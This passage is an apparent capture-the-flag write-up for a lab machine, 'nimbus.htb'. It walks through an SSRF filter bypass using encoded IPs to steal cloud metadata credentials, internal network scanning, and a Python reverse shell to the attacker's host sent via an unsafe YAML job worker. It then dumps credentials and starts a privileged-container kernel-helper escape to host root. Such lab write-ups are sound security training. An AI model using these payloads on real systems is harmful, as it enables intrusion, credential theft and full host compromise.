+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Raw response<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span>nimbus-web-role<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Parsed<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span>nimbus-web-role<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The bypass works, and there’s one role: <strong><code>nimbus-web-role</code></strong>. Now we pull its temporary credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Success&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;LastUpdated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2026-06-27T18:48:41Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS-HMAC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AccessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ASIAQX4PG7L2K9M3N5R8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SecretAccessKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Token&quot;</span><span class="punctuation">:</span> <span class="string">&quot;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Expiration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2026-06-28T00:48:41Z&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>A full set of STS credentials — an <code>ASIA...</code> key plus a session token. While we have the SSRF open we also grab the instance’s own internal address, which will matter later when we start poking around the private network:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://0251.0376.0251.0376/latest/meta-data/local-ipv4?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Raw response<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span>10.0.1.42<span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We save the credentials into <code>creds.json</code> so boto3 can pick them up cleanly.</p>
+<h2 id="Enumerating-the-Role"><a href="#Enumerating-the-Role" class="headerlink" title="Enumerating the Role"></a>Enumerating the Role</h2><p>The health endpoint told us everything talks to <code>aws.nimbus.htb</code>, so that’s our <code>--endpoint-url</code>. We write a tiny boto3 probe to confirm who we are and brute-force our way through the obvious read calls:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3, json</span><br><span class="line">c = json.load(<span class="built_in">open</span>(<span class="string">&#x27;creds.json&#x27;</span>))</span><br><span class="line">s = boto3.Session(aws_access_key_id=c[<span class="string">&#x27;AccessKeyId&#x27;</span>],</span><br><span class="line">                  aws_secret_access_key=c[<span class="string">&#x27;SecretAccessKey&#x27;</span>],</span><br><span class="line">                  aws_session_token=c[<span class="string">&#x27;Token&#x27;</span>], region_name=<span class="string">&#x27;us-east-1&#x27;</span>)</span><br><span class="line">EP = <span class="string">&quot;http://aws.nimbus.htb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CALLER:&quot;</span>, s.client(<span class="string">&#x27;sts&#x27;</span>, endpoint_url=EP).get_caller_identity()[<span class="string">&#x27;Arn&#x27;</span>])</span><br><span class="line"><span class="keyword">for</span> svc, m <span class="keyword">in</span> [(<span class="string">&quot;sqs&quot;</span>,<span class="string">&quot;list_queues&quot;</span>),(<span class="string">&quot;s3&quot;</span>,<span class="string">&quot;list_buckets&quot;</span>),(<span class="string">&quot;lambda&quot;</span>,<span class="string">&quot;list_functions&quot;</span>),</span><br><span class="line">               (<span class="string">&quot;dynamodb&quot;</span>,<span class="string">&quot;list_tables&quot;</span>),(<span class="string">&quot;sns&quot;</span>,<span class="string">&quot;list_topics&quot;</span>),(<span class="string">&quot;codebuild&quot;</span>,<span class="string">&quot;list_projects&quot;</span>)]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">getattr</span>(s.client(svc, endpoint_url=EP), m)()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ALLOWED] <span class="subst">&#123;svc&#125;</span>.<span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[DENIED]  <span class="subst">&#123;svc&#125;</span>.<span class="subst">&#123;m&#125;</span> -&gt; <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CALLER: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a</span><br><span class="line">[ALLOWED] sqs.list_queues</span><br><span class="line">[DENIED]  s3.list_buckets -&gt; AccessDenied</span><br><span class="line">[DENIED]  lambda.list_functions -&gt; ClientError</span><br><span class="line">[DENIED]  dynamodb.list_tables -&gt; ClientError</span><br><span class="line">[DENIED]  sns.list_topics -&gt; ClientError</span><br><span class="line">[DENIED]  codebuild.list_projects -&gt; ClientError</span><br></pre></td></tr></table></figure></div>
+
+<p>Account <code>847219365028</code>, and the role is locked down tight — the <em>only</em> thing it can do is list SQS queues. So that’s the only thread to pull:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(s.client(<span class="string">&#x27;sqs&#x27;</span>, endpoint_url=<span class="string">&quot;http://aws.nimbus.htb&quot;</span>).list_queues())</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;QueueUrls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;http://floci:4566/847219365028/nimbus-jobs&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>One queue, <strong><code>nimbus-jobs</code></strong>. And look at the URL it returns — not <code>aws.nimbus.htb</code>, but <code>http://floci:4566/...</code>. That’s the <em>internal</em> hostname of the backend (<code>floci</code>) on port <code>4566</code>, which is <a class="link"   target="_blank" rel="noopener" href="https://www.localstack.cloud/" >LocalStack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘s default port. So the public <code>aws.nimbus.htb</code> is just a proxy in front of a LocalStack container called <code>floci</code>. Worth remembering.</p>
+<h2 id="Reaching-Internal-LocalStack-SSRF-round-two"><a href="#Reaching-Internal-LocalStack-SSRF-round-two" class="headerlink" title="Reaching Internal LocalStack (SSRF, round two)"></a>Reaching Internal LocalStack (SSRF, round two)</h2><p>The role can list a queue but can’t read S3, and we really want to know what the workers actually <em>do</em> with these jobs. The S3 data lives on that internal <code>floci</code> box. Our SSRF runs from inside the network, so it can reach internal hosts the role’s IAM can’t — but first we have to actually <em>find</em> floci.</p>
+<p>Trying the hostname through the SSRF gets us nowhere (it doesn’t resolve on the fetcher side), and the plain private IP is blocked by the same policy as before. So we lean on the same encoding trick used for the metadata service, this time with decimal IPs, and sweep the Docker bridge range for anything answering LocalStack’s health endpoint on <code>4566</code>. The instance was <code>10.0.1.42</code>, but LocalStack containers usually sit on a <code>172.x</code> bridge, so we start there:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ssrf</span></span>() &#123; curl -s -X POST http://nimbus.htb/jobs/preview --data-urlencode <span class="string">&quot;url=<span class="variable">$1</span>&quot;</span> ; &#125;</span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> 1 2 3 4 5 6; <span class="keyword">do</span></span><br><span class="line">  dec=$(python3 -c <span class="string">&quot;print((172&lt;&lt;24)+(18&lt;&lt;16)+<span class="variable">$o</span>)&quot;</span>)</span><br><span class="line">  body=$(ssrf <span class="string">&quot;http://<span class="variable">$dec</span>:4566/_localstack/health?a=test.yaml&quot;</span>)</span><br><span class="line">  raw=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> | sed -n <span class="string">&#x27;s@.*Raw response&lt;/h3&gt;&lt;pre&gt;\(.*\)@\1@p&#x27;</span> | <span class="built_in">head</span> -c 60)</span><br><span class="line">  err=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$body</span>&quot;</span> | grep -oiE <span class="string">&quot;could not fetch|internal resource&quot;</span> | <span class="built_in">head</span> -1)</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;172.18.0.<span class="variable">$o</span> (<span class="variable">$dec</span>) -&gt; <span class="variable">$&#123;raw:-<span class="variable">$&#123;err:-no-response&#125;</span>&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">172.18.0.1 (2886860801) -&gt; Could not fetch</span><br><span class="line">172.18.0.2 (2886860802) -&gt; &#123;&amp;#34;edition&amp;#34;:&amp;#34;community&amp;#34;,&amp;#34;services&amp;#34;:&#123;&amp;#34;ssm&amp;#34;:&amp;#34;ru</span><br><span class="line">172.18.0.3 (2886860803) -&gt; Could not fetch</span><br><span class="line">172.18.0.4 (2886860804) -&gt; Could not fetch</span><br><span class="line">172.18.0.5 (2886860805) -&gt; Could not fetch</span><br><span class="line">172.18.0.6 (2886860806) -&gt; Could not fetch</span><br></pre></td></tr></table></figure></div>
+
+<p>There it is — <code>172.18.0.2:4566</code> (decimal <code>2886860802</code>) is floci. The full health output confirms it’s a fat LocalStack instance with basically every service turned on:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://2886860802:4566/_localstack/health?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;edition&quot;</span><span class="punctuation">:</span> <span class="string">&quot;community&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;services&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ssm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sqs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;s3&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dynamodb&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sns&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;lambda&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;iam&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ... (<span class="number">51</span> services total) ...</span><br><span class="line">    <span class="attr">&quot;codebuild&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ec2&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ecs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ecr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>codebuild</code> being “running” catches our eye immediately (keep that in mind), but first things first — we want the source. The <code>nimbus-web-role</code> couldn’t <code>GetObject</code> on the public endpoint, but the <em>internal</em> LocalStack doesn’t ask us for credentials at all. The bucket will be something dev-flavoured, and <code>nimbus-dev-artifacts</code> is the obvious guess for where a job worker’s code would be staged. Path-style S3 read, through the SSRF, via the decimal IP:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST http://nimbus.htb/jobs/preview \</span><br><span class="line">  --data-urlencode <span class="string">&quot;url=http://2886860802:4566/nimbus-dev-artifacts/source/worker.py?a=test.yaml&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Nimbus job worker&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os, time, subprocess, boto3, yaml</span><br><span class="line"></span><br><span class="line">ENDPOINT  = os.environ.get(<span class="string">&quot;AWS_ENDPOINT_URL&quot;</span>, <span class="string">&quot;http://aws.nimbus.htb&quot;</span>)</span><br><span class="line">QUEUE_URL = os.environ.get(<span class="string">&quot;QUEUE_URL&quot;</span>, <span class="string">&quot;http://aws.nimbus.htb/847219365028/nimbus-jobs&quot;</span>)</span><br><span class="line">REGION    = os.environ.get(<span class="string">&quot;AWS_DEFAULT_REGION&quot;</span>, <span class="string">&quot;us-east-1&quot;</span>)</span><br><span class="line">POLL_SECS = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">sqs = boto3.client(<span class="string">&quot;sqs&quot;</span>, endpoint_url=ENDPOINT, region_name=REGION)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">body</span>):</span><br><span class="line">    job = yaml.load(body, Loader=yaml.Loader)              <span class="comment"># full (unsafe) loader</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(job, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    name   = job.get(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;&lt;unnamed&gt;&quot;</span>)</span><br><span class="line">    script = job.get(<span class="string">&quot;script&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> script:</span><br><span class="line">        result = subprocess.run([<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;-c&quot;</span>, script], <span class="comment"># runs attacker-controlled code</span></span><br><span class="line">            capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = sqs.receive_message(QueueUrl=QUEUE_URL, MaxNumberOfMessages=<span class="number">1</span>, WaitTimeSeconds=POLL_SECS)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> resp.get(<span class="string">&quot;Messages&quot;</span>, []):</span><br><span class="line">            handle_message(m[<span class="string">&quot;Body&quot;</span>])</span><br><span class="line">            sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m[<span class="string">&quot;ReceiptHandle&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>This is the whole foothold sitting in thirty lines. The web front-end loudly parses with <code>safe_load</code> and promises “no code execution at submission time” — but the <em>worker</em> on the far side of the queue does the exact opposite. It pulls each message off <code>nimbus-jobs</code>, runs it through <code>yaml.load(..., Loader=yaml.Loader)</code> (the unsafe full loader), then takes a <code>script</code> field straight out of the job and feeds it to <code>python3 -c</code>. And the one permission our stolen role <em>does</em> have is the ability to write to that queue. So this is remote code execution by design — we just have to send the worker a job.</p>
+<h2 id="Foothold-→-user-txt"><a href="#Foothold-→-user-txt" class="headerlink" title="Foothold → user.txt"></a>Foothold → user.txt</h2><p>Listener up:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure></div>
+
+<p>Then we enqueue a job whose <code>script</code> field is a Python reverse shell. The role can <code>SendMessage</code> to <code>nimbus-jobs</code>; the worker polls every 5 seconds, deserialises our message, and executes our code:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3, json</span><br><span class="line">c = json.load(<span class="built_in">open</span>(<span class="string">&#x27;creds.json&#x27;</span>))</span><br><span class="line">s = boto3.Session(aws_access_key_id=c[<span class="string">&#x27;AccessKeyId&#x27;</span>],</span><br><span class="line">                  aws_secret_access_key=c[<span class="string">&#x27;SecretAccessKey&#x27;</span>],</span><br><span class="line">                  aws_session_token=c[<span class="string">&#x27;Token&#x27;</span>], region_name=<span class="string">&#x27;us-east-1&#x27;</span>)</span><br><span class="line">sqs = s.client(<span class="string">&#x27;sqs&#x27;</span>, endpoint_url=<span class="string">&quot;http://aws.nimbus.htb&quot;</span>)</span><br><span class="line">Q = <span class="string">&quot;http://aws.nimbus.htb/847219365028/nimbus-jobs&quot;</span></span><br><span class="line"></span><br><span class="line">script = (<span class="string">&#x27;import socket,subprocess,os;&#x27;</span></span><br><span class="line">          <span class="string">&#x27;s=socket.socket();s.connect((&quot;10.10.16.32&quot;,9001));&#x27;</span></span><br><span class="line">          <span class="string">&#x27;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);&#x27;</span></span><br><span class="line">          <span class="string">&#x27;subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span>)</span><br><span class="line">body = json.dumps(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;r1&quot;</span>, <span class="string">&quot;runtime&quot;</span>: <span class="string">&quot;python3.11&quot;</span>, <span class="string">&quot;script&quot;</span>: script&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sent&quot;</span>, sqs.send_message(QueueUrl=Q, MessageBody=body)[<span class="string">&quot;MessageId&quot;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sent 54c6e6b4-da7f-411a-9dd1-7e73081da0c0</span><br></pre></td></tr></table></figure></div>
+
+<p>A few seconds later the worker calls home:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.129.33.240 52894</span><br><span class="line">worker@eebc6a19dffa:~$ id</span><br><span class="line">uid=1000(worker) gid=1000(worker) groups=1000(worker)</span><br><span class="line">worker@eebc6a19dffa:~$ cat /home/*/user.txt</span><br><span class="line">d8c39dd75ca9085d8a0a6027492e1259</span><br></pre></td></tr></table></figure></div>
+
+<p>We have <code>user.txt</code>.</p>
+<h2 id="Enumerating-from-Inside-the-Worker"><a href="#Enumerating-from-Inside-the-Worker" class="headerlink" title="Enumerating from Inside the Worker"></a>Enumerating from Inside the Worker</h2><p>We’re <code>uid=1000(worker)</code> inside a container (<code>eebc6a19dffa</code>). Time to look around for the way up. A few things stand out immediately:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">worker@eebc6a19dffa:~$ uname -a</span><br><span class="line">Linux eebc6a19dffa 6.8.0-124-generic #124-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">worker@eebc6a19dffa:~$ env | grep -iE &#x27;aws|queue|endpoint|region&#x27; | sort</span><br><span class="line">AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN</span><br><span class="line">AWS_DEFAULT_REGION=us-east-1</span><br><span class="line">AWS_ENDPOINT_URL=http://aws.nimbus.htb</span><br><span class="line">AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh</span><br><span class="line">QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs</span><br><span class="line"></span><br><span class="line">worker@eebc6a19dffa:~$ getent hosts floci</span><br><span class="line">172.18.0.2      floci</span><br><span class="line"></span><br><span class="line">worker@eebc6a19dffa:~$ sudo -n true 2&gt;&amp;1; echo rc=$?</span><br><span class="line">/bin/sh: 1: sudo: not found</span><br></pre></td></tr></table></figure></div>
+
+<p>Two useful facts. First, the worker carries its own <em>static</em> AWS keys (<code>AKIA...</code>, long-lived, not the STS ones we stole) baked into its environment. Second — and this is the big one — from in here <code>floci</code> resolves and is directly reachable. So we can talk to that internal LocalStack on <code>floci:4566</code> with no proxy in the way.</p>
+<p>Remember <code>codebuild.list_projects</code> was <strong>denied</strong> on the public endpoint? Let’s see what happens against the internal one. In fact, let’s deliberately use <em>garbage</em> credentials to test whether it even bothers checking:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3, os</span><br><span class="line">os.environ[<span class="string">&#x27;AWS_ACCESS_KEY_ID&#x27;</span>]=<span class="string">&#x27;junk&#x27;</span>; os.environ[<span class="string">&#x27;AWS_SECRET_ACCESS_KEY&#x27;</span>]=<span class="string">&#x27;junk&#x27;</span></span><br><span class="line">cb = boto3.client(<span class="string">&#x27;codebuild&#x27;</span>, endpoint_url=<span class="string">&#x27;http://floci:4566&#x27;</span>, region_name=<span class="string">&#x27;us-east-1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;list_projects (junk creds) =&quot;</span>, cb.list_projects()[<span class="string">&#x27;projects&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list_projects (junk creds) = []</span><br></pre></td></tr></table></figure></div>
+
+<p>That’s the whole ballgame. The internal LocalStack runs with IAM enforcement <strong>off</strong> — it accepted obviously-fake credentials and answered anyway. The public proxy enforces IAM; floci does not. And one of its 51 running services is CodeBuild, which we now have completely unauthenticated access to from inside the worker.</p>
+<h2 id="Privilege-Escalation-→-root-txt"><a href="#Privilege-Escalation-→-root-txt" class="headerlink" title="Privilege Escalation → root.txt"></a>Privilege Escalation → root.txt</h2><p>CodeBuild in LocalStack backs its builds with real Docker containers on the host. The dangerous part is that a project can request <code>privilegedMode: true</code>, which gives the build container a fat capability set, a shared kernel with the host, and write access into <code>/proc/sys/...</code>. That’s not a build setting, that’s a host-root primitive waiting to be used. The plan:</p>
+<ol>
+<li>Create a privileged CodeBuild project (image <code>floci/floci:latest</code>, the same image floci uses, so it’s present locally).</li>
+<li>Inside the build, abuse the kernel <strong>usermode-helper</strong> mechanism. When the kernel hits a binary format it doesn’t recognise, it calls the program named in <code>/proc/sys/kernel/modprobe</code> — and in a privileged container that file is writable and resolves against the host filesystem through the overlay <code>upperdir</code>. So we point it at our own script and then trigger it by executing a file with bogus magic bytes (<code>\xff\xff\xff\xff</code>). The kernel can’t find a handler → runs our script → <strong>as host root</strong>.</li>
